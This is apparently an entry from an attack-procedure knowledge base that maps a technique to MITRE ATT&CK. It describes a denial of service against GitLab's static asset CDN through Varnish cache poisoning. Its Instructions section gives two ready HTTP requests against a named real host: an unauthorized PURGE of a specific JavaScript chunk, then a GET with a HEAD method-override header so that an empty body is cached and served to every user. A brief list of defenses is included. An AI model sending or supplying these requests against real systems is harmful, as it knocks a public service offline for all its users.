---
id: proc-4
tags:
  - purge
  - cache-poisoning
  - dos
  - uncontrolled-consumption
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Cloud (GCP)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:56.031Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Purge-and-Poison-Live-Cache-for-DoS

## Summary

This procedure clears the existing cache entry using an unauthorized PURGE request and then poisons the live cache with an empty response, enabling full DoS impact on all users accessing GitLab's static assets.

## Description

Exploiting the lack of authorization on PURGE in Varnish, this evicts valid entries before injecting the poisoning request without a buster. The result is empty JS/CSS served site-wide, breaking GitLab.com and about.gitlab.com. This amplifies the cache poisoning in unsecured CDN setups on GCP.

## Requirements

1. HTTP client supporting PURGE method (e.g., curl with --request PURGE)
2. Target resource URL without query parameters for live hit
3. No auth, but awareness of potential rate limits

## Defense

Defensive measures and detection strategies:

- Require authentication or IP whitelisting for PURGE requests
- Rate-limit PURGE operations and alert on unauthorized attempts
- Use cache invalidation tokens

## Objectives

1. Evict good cache to enable poisoning
2. Poison main resource for broad DoS
3. Disrupt service for all CDN users

## Instructions

### Step 1: Send PURGE Request

**Context**: Clear the existing cache entry for the target asset.

Send:

```http
PURGE /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js HTTP/1.1
Host: assets.gitlab-static.net
```

> Expected: 200 OK or 204 No Content, indicating successful purge.

### Step 2: Immediately Poison Live Cache

**Context**: Follow up with the poisoning request to fill the cache with empty content.

Send:

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js HTTP/1.1
Host: assets.gitlab-static.net
X-Http-Method-Override: HEAD
```

> Expected: Empty body cached and served to subsequent requests, causing DoS.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[purge]]
- [[cache-poisoning]]
- [[dos]]
- [[uncontrolled-consumption]]
